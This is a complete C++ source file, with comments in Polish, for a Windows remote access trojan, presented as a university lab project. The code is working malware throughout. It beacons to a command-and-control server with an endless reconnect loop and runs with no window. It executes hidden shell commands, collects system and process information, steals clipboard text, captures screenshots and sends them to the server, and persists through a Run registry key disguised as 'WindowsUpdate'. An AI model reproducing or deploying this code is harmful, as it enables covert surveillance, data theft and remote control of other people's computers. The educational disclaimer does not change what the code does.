// ============================================================
//  UWAGA: Plik stworzony wyłącznie w celach edukacyjnych.
//  Projekt akademicki — demonstracja technik RAT w izolowanym
//  środowisku laboratoryjnym. Nie używać poza środowiskiem
//  kontrolowanym przez uczelnię.
//
//  Autor:    Borys Gankowski
//  Uczelnia: Uniwersytet Vizja
//  Przedmiot: Projekt zespołowy — RAT malware z serwerem C2
//  Rok akademicki: 2025/2026
// ============================================================

// --- Nagłówki systemowe Windows ---
#include <winsock2.h>       // Winsock2 — komunikacja TCP (musi być przed windows.h)
#include <ws2tcpip.h>       // inet_pton, getaddrinfo
#include <windows.h>        // Windows API (rejestr, procesy, schowek, GDI)
#include <tlhelp32.h>       // CreateToolhelp32Snapshot — listowanie procesów
#include <gdiplus.h>        // GDI+ — przechwytywanie ekranu (screenshot)

// --- Nagłówki standardowe ---
#include <string>
#include <sstream>
#include <vector>
#include <stdexcept>

// --- Linkowanie bibliotek ---
// W Visual Studio można też dodać przez Project > Properties > Linker > Input
#pragma comment(lib, "ws2_32.lib")     // Winsock2
#pragma comment(lib, "gdiplus.lib")    // GDI+

// ============================================================
//  KONFIGURACJA — uzupełnić przed kompilacją
// ============================================================

// [PLACEHOLDER] Adres IP serwera C2 (maszyna Kali Linux w sieci host-only)
// Uzgodnić z osobą odpowiedzialną za C2 przed kompilacją
#define C2_HOST "192.168.56.10"

// [PLACEHOLDER] Port nasłuchowy serwera C2
// Musi być zgodny z konfiguracją serwera C2
#define C2_PORT 4444

// Opóźnienie (w milisekundach) między próbami reconnect po zerwaniu połączenia
#define RECONNECT_DELAY_MS 5000

// Magic byte — identyfikacja RAT wobec serwera C2
// 0x01 = dropper, 0x02 = RAT (uzgodnione z serwerem C2)
#define MAGIC_BYTE 0x02

// Marker końca odpowiedzi — serwer C2 oczekuje tego ciągu po każdej odpowiedzi
// Musi być identyczny po stronie serwera C2
#define END_MARKER "<<END>>\n"

// ============================================================
//  FORWARD DECLARATIONS — deklaracje funkcji
// ============================================================

// Połączenie z C2
SOCKET  connectToC2();
void    mainLoop(SOCKET sock);

// Obsługa komend
std::string handleCommand(const std::string& cmd);

// Moduły funkcjonalne
std::string cmdSysinfo();       // Informacje o systemie (T1082, T1016)
std::string cmdShell(const std::string& command);   // Reverse shell (T1059)
std::string cmdListProcesses(); // Listowanie procesów (T1057)
std::string cmdClipboard();     // Kradzież schowka (T1115)
bool        cmdPersist();       // Persistence przez rejestr (T1547.001)
bool        cmdScreenshot(SOCKET sock); // Screenshot i wysyłka (T1113)

// Helpery
void        sendResponse(SOCKET sock, const std::string& response);
std::string recvLine(SOCKET sock);
std::vector<BYTE> captureScreenToJpeg();


// ============================================================
//  PUNKT WEJŚCIA
//  WinMain zamiast main() — brak okna konsoli po uruchomieniu
// ============================================================
int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    int       nCmdShow)
{
    // --- Inicjalizacja Winsock ---
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        // Winsock niedostępny — cicha śmierć (brak okna błędu)
        return 1;
    }

    // --- Inicjalizacja GDI+ (potrzebne do screenshot) ---
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // --- Główna pętla reconnect ---
    // RAT próbuje połączyć się z C2 w nieskończonej pętli.
    // Jeśli połączenie zostanie zerwane — czeka RECONNECT_DELAY_MS i próbuje ponownie.
    while (true) {
        SOCKET sock = connectToC2();

        if (sock != INVALID_SOCKET) {
            // Połączenie udane — wejdź w pętlę obsługi komend
            mainLoop(sock);
            closesocket(sock);
        }

        // Odczekaj przed kolejną próbą
        Sleep(RECONNECT_DELAY_MS);
    }

    // --- Sprzątanie (kod niedostępny, ale dla porządku) ---
    Gdiplus::GdiplusShutdown(gdiplusToken);
    WSACleanup();
    return 0;
}


// ============================================================
//  connectToC2()
//  Nawiązuje połączenie TCP z serwerem C2.
//  Wysyła magic byte 0x02 identyfikujący RAT.
//  Zwraca: SOCKET (otwarty) lub INVALID_SOCKET przy błędzie.
// ============================================================
SOCKET connectToC2()
{
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(C2_PORT);

    // Konwersja adresu IP z tekstu na formę binarną
    if (inet_pton(AF_INET, C2_HOST, &serverAddr.sin_addr) != 1) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // Próba połączenia
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    // Wyślij magic byte — identyfikacja wobec C2
    // Serwer C2 czyta pierwszy bajt i decyduje: 0x01=dropper, 0x02=RAT
    char magicByte = MAGIC_BYTE;
    if (send(sock, &magicByte, 1, 0) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}


// ============================================================
//  mainLoop()
//  Główna pętla sesji — odbiera komendy od C2 i wysyła odpowiedzi.
//  Działa do zerwania połączenia lub komendy "exit".
// ============================================================
void mainLoop(SOCKET sock)
{
    // Po nawiązaniu połączenia — wyślij automatyczny sysinfo
    std::string sysinfo = cmdSysinfo();
    sendResponse(sock, sysinfo);

    // Pętla obsługi komend
    while (true) {
        // Odbierz komendę od serwera C2
        std::string cmd = recvLine(sock);

        if (cmd.empty()) {
            // Połączenie zerwane — wyjdź z pętli, reconnect nastąpi wyżej
            break;
        }

        // Usuń białe znaki z końca
        while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r'))
            cmd.pop_back();

        // Obsłuż komendę "exit" — czyste zamknięcie sesji
        if (cmd == "exit") {
            break;
        }

        // Obsłuż komendę "screenshot" osobno — wymaga bezpośredniego dostępu do socketu
        if (cmd == "screenshot") {
            bool ok = cmdScreenshot(sock);
            if (!ok) sendResponse(sock, "[!] Screenshot failed\n");
            continue;
        }

        // Obsłuż pozostałe komendy — otrzymaj odpowiedź tekstową i wyślij do C2
        std::string response = handleCommand(cmd);
        sendResponse(sock, response);
    }
}


// ============================================================
//  handleCommand()
//  Dispatcher — dopasowuje komendę do odpowiedniej funkcji.
//  Zwraca: odpowiedź tekstową do wysłania do C2.
// ============================================================
std::string handleCommand(const std::string& cmd)
{
    // Komenda: sysinfo — informacje o systemie
    if (cmd == "sysinfo") {
        return cmdSysinfo();
    }

    // Komenda: listproc — lista aktywnych procesów
    if (cmd == "listproc") {
        return cmdListProcesses();
    }

    // Komenda: clipboard — zawartość schowka
    if (cmd == "clipboard") {
        return cmdClipboard();
    }

    // Komenda: persist — ustanowienie persistence przez rejestr
    if (cmd == "persist") {
        bool ok = cmdPersist();
        return ok ? "[+] Persistence established\n" : "[-] Persistence failed\n";
    }

    // Komenda: shell <polecenie> — wykonanie polecenia systemowego
    // Format: "shell dir C:\Users"
    if (cmd.substr(0, 6) == "shell ") {
        std::string shellCmd = cmd.substr(6); // Wytnij prefiks "shell "
        return cmdShell(shellCmd);
    }

    // Nieznana komenda
    return "[!] Unknown command: " + cmd + "\n";
}


// ============================================================
//  cmdSysinfo()
//  Zbiera podstawowe informacje o systemie ofiary.
//  MITRE ATT&CK: T1082 (System Information Discovery)
//                T1016 (System Network Configuration Discovery)
//  Zwraca: sformatowany string z danymi systemu.
// ============================================================
std::string cmdSysinfo()
{
    std::ostringstream out;
    out << "=== SYSINFO ===\n";

    // --- Nazwa komputera ---
    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD computerNameSize = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameSize))
        out << "Hostname:  " << computerName << "\n";
    else
        out << "Hostname:  [BŁĄD]\n";

    // --- Nazwa zalogowanego użytkownika ---
    char userName[256] = {};
    DWORD userNameSize = sizeof(userName);
    if (GetUserNameA(userName, &userNameSize))
        out << "Username:  " << userName << "\n";
    else
        out << "Username:  [BŁĄD]\n";

    // --- Wersja systemu operacyjnego ---
    // [PLACEHOLDER] GetVersionEx jest deprecated od Windows 8.1.
    // Docelowo użyć RtlGetVersion() lub odczytać z rejestru:
    // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    // Na potrzeby PoC GetVersionEx wystarczy.
    OSVERSIONINFOA osInfo{};
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
#pragma warning(suppress: 4996) // Suppress deprecated warning
    GetVersionExA(&osInfo);
    out << "OS:        Windows " << osInfo.dwMajorVersion << "."
        << osInfo.dwMinorVersion << " (Build " << osInfo.dwBuildNumber << ")\n";

    // --- Adres IP (pierwsza karta sieciowa) ---
    char hostName[256] = {};
    gethostname(hostName, sizeof(hostName));
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    if (getaddrinfo(hostName, nullptr, &hints, &res) == 0 && res) {
        char ipStr[INET_ADDRSTRLEN] = {};
        inet_ntop(AF_INET,
            &((sockaddr_in*)res->ai_addr)->sin_addr,
            ipStr, sizeof(ipStr));
        out << "Local IP:  " << ipStr << "\n";
        freeaddrinfo(res);
    } else {
        out << "Local IP:  [BŁĄD]\n";
    }

    // --- Uprawnienia (admin?) ---
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup = nullptr;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    out << "Admin:     " << (isAdmin ? "YES" : "NO") << "\n";
    out << "===============\n";

    return out.str();
}


// ============================================================
//  cmdShell()
//  Wykonuje polecenie systemowe przez cmd.exe i zwraca wynik.
//  MITRE ATT&CK: T1059.003 (Windows Command Shell)
//  Parametr: command — polecenie do wykonania (bez "shell " prefiksu)
//  Zwraca: stdout + stderr polecenia jako string.
// ============================================================
std::string cmdShell(const std::string& command)
{
    // Obuduj komendę w cmd /c żeby obsłużyć wbudowane polecenia (dir, cd, echo...)
    std::string fullCmd = "cmd.exe /c " + command + " 2>&1";

    // Utwórz pipe do odczytu stdout procesu
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return "[!] Pipe creation failed\n";

    STARTUPINFOA si{};
    si.cb          = sizeof(si);
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Ukryj okno cmd.exe

    PROCESS_INFORMATION pi{};

    // Uruchom cmd.exe z przekierowanym stdout do pipe
    BOOL ok = CreateProcessA(
        nullptr,
        const_cast<LPSTR>(fullCmd.c_str()),
        nullptr, nullptr,
        TRUE,           // Dziedziczenie uchwytów (pipe)
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi);

    CloseHandle(hWrite); // Zamknij stronę zapisu — inaczej ReadFile nie zwróci EOF

    if (!ok) {
        CloseHandle(hRead);
        return "[!] Process creation failed\n";
    }

    // Odczytaj wynik z pipe
    std::string output;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }

    // Poczekaj na zakończenie procesu
    WaitForSingleObject(pi.hProcess, 10000); // Timeout 10 sekund
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    if (output.empty()) output = "(no output)\n";
    return output;
}


// ============================================================
//  cmdListProcesses()
//  Pobiera listę aktualnie uruchomionych procesów.
//  MITRE ATT&CK: T1057 (Process Discovery)
//  Zwraca: sformatowana lista PID + nazwa procesu.
// ============================================================
std::string cmdListProcesses()
{
    std::ostringstream out;
    out << "=== RUNNING PROCESSES ===\n";
    out << "PID\t\tNAME\n";
    out << "---\t\t----\n";

    // Utwórz snapshot wszystkich procesów w systemie
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return "[!] Failed to create process snapshot\n";

    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Iteruj po liście procesów
    if (Process32First(hSnap, &pe)) {
        do {
            out << pe.th32ProcessID << "\t\t" << pe.szExeFile << "\n";
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    out << "=========================\n";
    return out.str();
}


// ============================================================
//  cmdClipboard()
//  Odczytuje zawartość schowka systemowego.
//  MITRE ATT&CK: T1115 (Clipboard Data)
//  Zwraca: tekst ze schowka lub komunikat o błędzie.
// ============================================================
std::string cmdClipboard()
{
    // Otwórz dostęp do schowka
    if (!OpenClipboard(nullptr))
        return "[!] Cannot open clipboard\n";

    // Pobierz uchwyt do danych tekstowych (CF_TEXT = ANSI, CF_UNICODETEXT = Unicode)
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) {
        CloseClipboard();
        return "[!] No text in clipboard (or unsupported format)\n";
    }

    // Zablokuj uchwyt żeby uzyskać wskaźnik do danych
    char* pText = static_cast<char*>(GlobalLock(hData));
    std::string result;
    if (pText) {
        result = "=== CLIPBOARD ===\n";
        result += pText;
        result += "\n=================\n";
        GlobalUnlock(hData);
    } else {
        result = "[!] Failed to lock clipboard data\n";
    }

    CloseClipboard();
    return result;
}


// ============================================================
//  cmdPersist()
//  Dodaje RAT do autostartu przez klucz rejestru Run.
//  MITRE ATT&CK: T1547.001 (Registry Run Keys / Startup Folder)
//  Zwraca: true przy sukcesie, false przy błędzie.
// ============================================================
bool cmdPersist()
{
    // Pobierz pełną ścieżkę do aktualnie uruchomionego pliku .exe
    char exePath[MAX_PATH] = {};
    if (GetModuleFileNameA(nullptr, exePath, MAX_PATH) == 0)
        return false;

    // [PLACEHOLDER] Nazwa klucza rejestru — można zmienić na coś bardziej
    // przekonującego, np. "WindowsSecurityHealth", "SysMonitor" itp.
    const char* regKeyName   = "WindowsUpdate";

    // Klucz rejestru Run dla bieżącego użytkownika (nie wymaga uprawnień admina)
    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    const char* regKeyPath   = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        regKeyPath,
        0,
        KEY_SET_VALUE,
        &hKey);

    if (result != ERROR_SUCCESS) return false;

    // Zapisz ścieżkę do .exe jako wartość REG_SZ
    result = RegSetValueExA(
        hKey,
        regKeyName,
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(exePath),
        static_cast<DWORD>(strlen(exePath) + 1));

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}


// ============================================================
//  cmdScreenshot()
//  Przechwytuje zawartość ekranu i wysyła JPEG do serwera C2.
//  MITRE ATT&CK: T1113 (Screen Capture)
//  Protokół wysyłki:
//    [4 bajty big-endian: rozmiar JPEG] [N bajtów: dane JPEG]
//  Zwraca: true przy sukcesie, false przy błędzie.
// ============================================================
bool cmdScreenshot(SOCKET sock)
{
    // Zrób screenshot i zakoduj do JPEG w pamięci
    std::vector<BYTE> jpegData = captureScreenToJpeg();
    if (jpegData.empty()) return false;

    // Wyślij rozmiar jako 4 bajty big-endian
    uint32_t size = static_cast<uint32_t>(jpegData.size());
    uint32_t sizeBE = htonl(size); // Konwersja do big-endian (network byte order)
    if (send(sock, reinterpret_cast<char*>(&sizeBE), 4, 0) == SOCKET_ERROR)
        return false;

    // Wyślij dane JPEG
    DWORD totalSent = 0;
    while (totalSent < size) {
        int sent = send(sock,
            reinterpret_cast<char*>(jpegData.data()) + totalSent,
            size - totalSent, 0);
        if (sent == SOCKET_ERROR) return false;
        totalSent += sent;
    }

    return true;
}


// ============================================================
//  captureScreenToJpeg()
//  Pomocnicza — przechwytuje ekran przez GDI+ i koduje do JPEG.
//  Zwraca: wektor bajtów z danymi JPEG lub pusty wektor przy błędzie.
// ============================================================
std::vector<BYTE> captureScreenToJpeg()
{
    // Wymiary całego wirtualnego ekranu (obsługuje wiele monitorów)
    int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int screenW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screenH = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    // Utwórz kontekst urządzenia dla ekranu i bitmap w pamięci
    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    SelectObject(hdcMem, hBmp);

    // Skopiuj zawartość ekranu do bitmapy w pamięci
    BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, screenX, screenY, SRCCOPY);

    // Znajdź CLSID encodera JPEG w GDI+
    // [PLACEHOLDER] Można zmienić na "image/png" dla wyższej jakości
    CLSID jpegClsid;
    {
        UINT numEncoders = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&numEncoders, &size);
        std::vector<BYTE> buf(size);
        auto* encoders = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buf.data());
        Gdiplus::GetImageEncoders(numEncoders, size, encoders);
        jpegClsid = { 0 };
        for (UINT i = 0; i < numEncoders; i++) {
            if (std::wstring(encoders[i].MimeType) == L"image/jpeg") {
                jpegClsid = encoders[i].Clsid;
                break;
            }
        }
    }

    // Zakoduj bitmapę do JPEG w strumieniu IStream w pamięci
    std::vector<BYTE> result;
    IStream* pStream = nullptr;
    if (SUCCEEDED(CreateStreamOnHGlobal(nullptr, TRUE, &pStream))) {
        Gdiplus::Bitmap bitmap(hBmp, nullptr);
        // Jakość JPEG: 80 (0-100), kompromis rozmiar/jakość
        Gdiplus::EncoderParameters encoderParams;
        encoderParams.Count = 1;
        encoderParams.Parameter[0].Guid           = Gdiplus::EncoderQuality;
        encoderParams.Parameter[0].Type           = Gdiplus::EncoderParameterValueTypeLong;
        encoderParams.Parameter[0].NumberOfValues = 1;
        ULONG quality = 80;
        encoderParams.Parameter[0].Value = &quality;

        bitmap.Save(pStream, &jpegClsid, &encoderParams);

        // Skopiuj dane ze strumienia do wektora
        STATSTG stat{};
        pStream->Stat(&stat, STATFLAG_NONAME);
        ULONG jpegSize = static_cast<ULONG>(stat.cbSize.QuadPart);
        result.resize(jpegSize);
        LARGE_INTEGER li{};
        pStream->Seek(li, STREAM_SEEK_SET, nullptr);
        pStream->Read(result.data(), jpegSize, nullptr);
        pStream->Release();
    }

    // Sprzątanie GDI
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);

    return result;
}


// ============================================================
//  sendResponse()
//  Wysyła odpowiedź tekstową do serwera C2.
//  Dodaje marker END_MARKER na końcu żeby C2 wiedział
//  że odpowiedź jest kompletna.
// ============================================================
void sendResponse(SOCKET sock, const std::string& response)
{
    std::string full = response + END_MARKER;
    DWORD totalSent = 0;
    DWORD len = static_cast<DWORD>(full.size());

    // Pętla wysyłania — send() może wysłać mniej niż żądano
    while (totalSent < len) {
        int sent = send(sock, full.c_str() + totalSent, len - totalSent, 0);
        if (sent == SOCKET_ERROR) break;
        totalSent += sent;
    }
}


// ============================================================
//  recvLine()
//  Odbiera dane od serwera C2 aż do znaku '\n'.
//  Zwraca: odebraną linię lub pusty string przy błędzie/rozłączeniu.
// ============================================================
std::string recvLine(SOCKET sock)
{
    std::string line;
    char c;
    int result;

    while (true) {
        result = recv(sock, &c, 1, 0);
        if (result <= 0) return ""; // Błąd lub rozłączenie
        line += c;
        if (c == '\n') break;
    }

    return line;
}
